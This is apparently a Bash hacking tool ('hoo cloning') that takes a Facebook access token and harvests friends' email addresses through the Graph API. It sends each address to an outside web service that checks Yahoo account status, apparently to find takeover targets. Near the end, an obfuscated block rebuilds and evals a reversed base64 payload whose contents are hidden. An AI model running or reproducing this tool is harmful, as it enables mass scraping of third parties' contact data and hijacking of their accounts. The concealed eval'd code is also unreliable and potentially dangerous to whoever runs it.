#!/bin/bash
# -(c) zsecc0de-crew.id ~ widhisec
# -createon   : 16/04/2019
# -toolsname  : hoo cloning
# gak usah di edit nanti erorr gan
clear;
command -v curl > /dev/null 2>&1 || { echo >&2 "cURL not installed [!]"; }
if [[ ! -z $(command -v jq) ]]; then
	printf ""
else
	sleep 2
	apt install grep && apt install jq
	printf "selesai terinstall.\n"
fi
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
NORMAL=$(tput sgr0)
CYAN=$(tput setaf 6)
ti=$(set `date` && echo -e "$4 $5" | cut -d : -f1,2);
function banner () {
printf "
\t$GREEN.__                   
\t|  |__   ____   ____  
\t|  |  \ /  _ \ /  _ \  [${RED}Create By ${CYAN}Widhisec]
\t|   Y  (  <_> |  <_> ) 
\t|___|  /\____/ \____/ 
\t     \/  
\t
"
}
banner
function get_yahoo () {

                   get_yahoo=$(curl --silent "http://widhitools.000webhostapp.com/api/yahoo.php?" --data "email=$aa" | 
                   grep -Po '(?<="status":)[^,]*' | tr -d '""}')
                   printf "$aa > $get_yahoo \n" >> output.txt
                   printf "${CYAN}$aa [STATUS] > ${NORMAL}$get_yahoo\n"
}
function hey_kamu () {
	               echo -e -n $RED'[?]'${NORMAL}' Token : ' 
	               read t0k3n
	               echo "tunggu bentar.."
	               if [[ ! -e $t0k3n  ]]; then
	               	   printf "${RED}[!] ${NORMAL}tidak ada file token\n"
	               	   exit
	               fi
                   gEt=$(curl -X GET POST -s "https://graph.facebook.com/v3.2/me/friends/?fields=email&access_token=`cat $t0k3n`&limit=5000" | jq -r .data |
                   grep -Po '(?<="email":)[^,]*' | tr -d '""')
hBCxJLAZwioUfucNHyUyKHqJuxmAXIOBKXFPKfpWSGREFQMuFuOZOkWkziawBAwjkOOCJOEURllHEPAExDxqowNkHPcKKheyVzLZ="CSixaUWCZFVjuZzjSIxDVmNZXiGzWpRFmbeAIGmybseBSIFNrxoQFNFVYFitMuLMctNnjbmitlcuFXfwqUETfWLvNveqqBJbONXG";uAFsqYtCHDNiRNaCyzyfWHkDgbZjSJwkUvidOylUsoZsvcDxmgYIdpdAbrVBdvuuILaOsXWbSpNZGuMUnKFdXgLdGYkckIQgFEAj="NJCFBIEPDNzVbnOysifkMnuUVoJWupPsNCYHpkSenEXyAuGJUEScQpGWmektqwmxeeqJNUqZAKRwfiSUCTlBjBoEnVHBZGHHRjlc";vLxtXiKdysgzBNQgeFgnpbCAWfzPulMrDRwBJLGguQustWZLOvGHehLSUcYERgyYboYfeZVymbkQcIGkqACVrvNKTJiRsZgFgMxF="ch";sOeAMVGZRaNSSCGKhXIVMcAKyFGiigyFgpNibcVcMOrvEmQRVGUrsHJpmTKlWhQbideluUIXoxPLKObMKbpZrvsLSzlPMiGjICbG="4";IlMtvpYLVzlPvHkmobNJvlbsLWzuglveQZxpnGZCYRfAyIhNYianqVnVyfjMTJDTtAmRLFgSomneQzHeAgARYenyAuNdkiTRAyvF="";KwKKrgBaVgVJFjUMFTmgMqhnrjEjEgzKjtBeoslEdkUyRnxYfsIVifjatUEaRZQXUAiaejaqwrAgYgQOYxiMHjvMXZWOhwKjQrcW="RXzVLFaIoUqNQCIPEPOGFhKdsNlqfzDsgMxMxrdomLyuDDKtHateJtFnmKCDKnWwgBJtHZpVBkobshmPYCCzIwVJomZtHuRTkDuT";BQHHcPEhmictvioHSGvQCHoYhixidQVlEhpoUrDGmqNtayLjvYJsNmIZyoownGwvHtemwYmrBjHdUogeHsgHTmmmVflzogJaFXAG=" =oQKKoAdpF2dgACIgACIgACIgACIgACIgACIgAiCl52bkBCIgACIgACIgACIgACIgACIgACIKYCIi0XYhRyeiAybvhWY59FdldGIgACIgACIgACIgACIgACIgACIgowckFWZyhGdk0zKl5WasRmblBCdlxGIgACIgACIgACIgACIgACIgACIgowckFWZyhGdk0zKl5WasRnchR3cgQXZsBCIgACIgACIgACIgACIgACIgACIKsyKyVGduV3bjBCdlxGIgACIgACIgACIgACIgACIgACIgowKr4WZr9GdgQXZsBCIgACIgACIgACIgACIgACIgACIKkSKxsiclRnb192YkgCKk0jblt2b0BCIgACIgACIgACIgACIgACIgACIKISf9NHZhVmcoR3X0xWdhZWZktHJtoTM7RiI9MHZhVmcoRHIgACIgACIgACIgACIgACIgACIgogIwEjI9MHZhVmcoR3X0xWdhZWZkBCIgACIgACIgACIgACIgACIgACIKATPyVGduV3bjBCIgACIgACIgACIgACIgACIgACIKIyckFWZyhGdkISPl5WasRmblBCIgACIgACIgACIgACIgACIgACIKMyIjASM9UmbpxGdyFGdzBCIgACIgACIgACIgACIgACIgACIK8GZgsDdFdGJg4WagEWYgI3bmBCIgACIgACIgACIgACIgoAK | r";KpQIYQBKDJFhisOqOrILqsBaFjBmDhlgMHPolLsnMzzxEToTlYIGOIJiDIWLaAXYVikifMlcGAJXZNxXcXBqrKWCHPajqSrCxIcU="JSdfqDbQjzRXHRqtCspZpDLFWjFZXhJRnqgkDCXfAIwiTWdQuZcEKgrMwuFVLMzzoJrPliaqZlDVyrqGDmDUllnDMBUUnxIurfmH";rMcqeHWhGOmCnIybZrUPQyccTCFyVJHuhTXEkhhiuOVWxiLyHQiHrJAZfqROduISMcJcXwtHHtZRjLmWkamNTCnqvgsHlGTrkwpT="";ZPJJOMtkzovaAophmMIWAkqyMjwlvKufGZRTiLSxLshrbjHQioJNxyndcXZAPSlEYsKsENqfgDXWklTieHwtAXtQllSKnSXKrear="as";tqVkANIMVpKhpKMYXFZJbdllMhdZysALFRjXDaYZMAqBhcINMievwDsFUQLnyGftTruTTNMOaQcSLvuFlmBuqbVMweRNcemIPPYT="RADjFoPocTyiCpDlXbEsEqlZChKeAwuHqJRCfsQgydIZrjxuSlSsCzEbMKHVnlIWZmrFEfQrUHkUHGmVfdIrOLZiZpqErOOrONQT";hudagpgjEoAitUrrlXJNbKyQWTsuCPhBBjvgonHHFENoWKkmKWlUXJzNhsEaUdEJkPreUHIhQeBNCRUNMulwXoYdssNWIxPKUTHa="GVsnRFeYDCMtZPnyEOjDzOwbHIkbKUbMvZlMUkkacunzuHLGhBohmheQkJSdxKDcZJUYjZhruFMLaYKaqxknYfxfsGpijtyBJkIw";OiPMdBAorMJyKLbiYDWheafCufbNoAqLoNmmqdGDEYQPGXheeVesDsgzIdFfWUtsOvLQIBOCyUHKonEtwaRnvdRLVmhXNEmDCknv="o";WjSFaixiEvHwMxvpcxXBpjReoDjAnqfGeXrEYOwvYXoPeNoImoMRPyAxvMhbQQofDYvrZbFzSvZDDyVArHNrZrCFvVOehbhiyzDZ="6";ijWUXGSRdPOEUrTjirgFVYOsFVatnsnPLfQofGsIuAewEaMvAOBIeolsSfOQUErzGeHmvgkzEAmGtNJQhSeqwAYJfvLoQOmjMnax="IWWMySLQLGcBNVYNBMnGNESLlMPDvXxjeeDIsTxbXCNzSuMUuThbABGOzOifgrPqScVwQXwpJIgQyngaGFStPcqvvLgEsadSdXpg";eslgyCEhPLtersmBjbsNQlVrzCSEZjSgiZmFiFBcOQviJTtEoiZWtBgTkKgSMorjailtNAWDTbTypjORczLnMRlRQgzhDAqQhPMb=" -d";rWVxCWeJwZxFiwlehelEMaJPiTmDJVlghMOYvktBmjMiooLgPFucsGkWpUubHOZhKKHYWuXpLDRtZmpSWWSqhSLsZOEIGhrVRPnJ="ogzjzkdctCGSmLEoHFuVtuEFecIvHLbeqyvSXTTVZhpYSZpSEwuFopxUfTVzXiyUnKhwiHuAIAjGxgZjjFfYRhPaLqKCsQWNxkQH";bAvwpPWzkmGruPeaDBNlgOxcgTbrotYvbuVuyrHTqOiMskNnLPhLLtpSHhzRlqGlqpqLaSFGxRZboKjAInpxwTlBabfIVydxgmEZ="";BCjqxKpeMwyWqVnpSyeqrCLuCQdLSYFfLexOvubDAAXHBkvHXLNSqnQRvUMtDCEcbwOummitlZlYqyWPFcJzVXavoTOFQYmViLAW="b";uDdgFapQrcpdsZZvtMytDIOWjrEIcgxFDCxbzMnCTCrxihoFetAgMExpNtkrHaSiOlJkPMNyHSgjhQEkjnKXMJczewhsgkIDmXQX="e";WPVwyzlcDKeFKixHVhYJFAIEktKVZqLikrzRsHvTNqHHIBAtTsgDGiAKGezBtZXbbQvakHvHTxJQmUejSAFpvkYFPORdTpdRihSt="v |";Tx=Eds;zxsVSMrGCQKJMgCqssrGKPzihtKzWHiPazyRpYkEzEDZmVZrEjYIWweIJeggzvHWBKToKShAGqStrvIImCyfNrlHmDWOywVUKimj="";KwsveQnAxkcJFwXRMQvGnQIHrvhPrPHyLmUTFHKdNuZlHKDkvwyyxpGEeCEWsZNsSeupYgbbsgcGbnpYprYsDLJDhQAYAATiFRGm=$(eval "$rMcqeHWhGOmCnIybZrUPQyccTCFyVJHuhTXEkhhiuOVWxiLyHQiHrJAZfqROduISMcJcXwtHHtZRjLmWkamNTCnqvgsHlGTrkwpT$uDdgFapQrcpdsZZvtMytDIOWjrEIcgxFDCxbzMnCTCrxihoFetAgMExpNtkrHaSiOlJkPMNyHSgjhQEkjnKXMJczewhsgkIDmXQX$vLxtXiKdysgzBNQgeFgnpbCAWfzPulMrDRwBJLGguQustWZLOvGHehLSUcYERgyYboYfeZVymbkQcIGkqACVrvNKTJiRsZgFgMxF$IlMtvpYLVzlPvHkmobNJvlbsLWzuglveQZxpnGZCYRfAyIhNYianqVnVyfjMTJDTtAmRLFgSomneQzHeAgARYenyAuNdkiTRAyvF$OiPMdBAorMJyKLbiYDWheafCufbNoAqLoNmmqdGDEYQPGXheeVesDsgzIdFfWUtsOvLQIBOCyUHKonEtwaRnvdRLVmhXNEmDCknv$BQHHcPEhmictvioHSGvQCHoYhixidQVlEhpoUrDGmqNtayLjvYJsNmIZyoownGwvHtemwYmrBjHdUogeHsgHTmmmVflzogJaFXAG$uDdgFapQrcpdsZZvtMytDIOWjrEIcgxFDCxbzMnCTCrxihoFetAgMExpNtkrHaSiOlJkPMNyHSgjhQEkjnKXMJczewhsgkIDmXQX$WPVwyzlcDKeFKixHVhYJFAIEktKVZqLikrzRsHvTNqHHIBAtTsgDGiAKGezBtZXbbQvakHvHTxJQmUejSAFpvkYFPORdTpdRihSt$rMcqeHWhGOmCnIybZrUPQyccTCFyVJHuhTXEkhhiuOVWxiLyHQiHrJAZfqROduISMcJcXwtHHtZRjLmWkamNTCnqvgsHlGTrkwpT$BCjqxKpeMwyWqVnpSyeqrCLuCQdLSYFfLexOvubDAAXHBkvHXLNSqnQRvUMtDCEcbwOummitlZlYqyWPFcJzVXavoTOFQYmViLAW$zxsVSMrGCQKJMgCqssrGKPzihtKzWHiPazyRpYkEzEDZmVZrEjYIWweIJeggzvHWBKToKShAGqStrvIImCyfNrlHmDWOywVUKimj$ZPJJOMtkzovaAophmMIWAkqyMjwlvKufGZRTiLSxLshrbjHQioJNxyndcXZAPSlEYsKsENqfgDXWklTieHwtAXtQllSKnSXKrear$uDdgFapQrcpdsZZvtMytDIOWjrEIcgxFDCxbzMnCTCrxihoFetAgMExpNtkrHaSiOlJkPMNyHSgjhQEkjnKXMJczewhsgkIDmXQX$WjSFaixiEvHwMxvpcxXBpjReoDjAnqfGeXrEYOwvYXoPeNoImoMRPyAxvMhbQQofDYvrZbFzSvZDDyVArHNrZrCFvVOehbhiyzDZ$IlMtvpYLVzlPvHkmobNJvlbsLWzuglveQZxpnGZCYRfAyIhNYianqVnVyfjMTJDTtAmRLFgSomneQzHeAgARYenyAuNdkiTRAyvF$sOeAMVGZRaNSSCGKhXIVMcAKyFGiigyFgpNibcVcMOrvEmQRVGUrsHJpmTKlWhQbideluUIXoxPLKObMKbpZrvsLSzlPMiGjICbG$eslgyCEhPLtersmBjbsNQlVrzCSEZjSgiZmFiFBcOQviJTtEoiZWtBgTkKgSMorjailtNAWDTbTypjORczLnMRlRQgzhDAqQhPMb$zxsVSMrGCQKJMgCqssrGKPzihtKzWHiPazyRpYkEzEDZmVZrEjYIWweIJeggzvHWBKToKShAGqStrvIImCyfNrlHmDWOywVUKimj");eval "$bAvwpPWzkmGruPeaDBNlgOxcgTbrotYvbuVuyrHTqOiMskNnLPhLLtpSHhzRlqGlqpqLaSFGxRZboKjAInpxwTlBabfIVydxgmEZ$KwsveQnAxkcJFwXRMQvGnQIHrvhPrPHyLmUTFHKdNuZlHKDkvwyyxpGEeCEWsZNsSeupYgbbsgcGbnpYprYsDLJDhQAYAATiFRGm$rMcqeHWhGOmCnIybZrUPQyccTCFyVJHuhTXEkhhiuOVWxiLyHQiHrJAZfqROduISMcJcXwtHHtZRjLmWkamNTCnqvgsHlGTrkwpT$IlMtvpYLVzlPvHkmobNJvlbsLWzuglveQZxpnGZCYRfAyIhNYianqVnVyfjMTJDTtAmRLFgSomneQzHeAgARYenyAuNdkiTRAyvF"
hey_kamu 
echo "selesai pada jam : $ti"
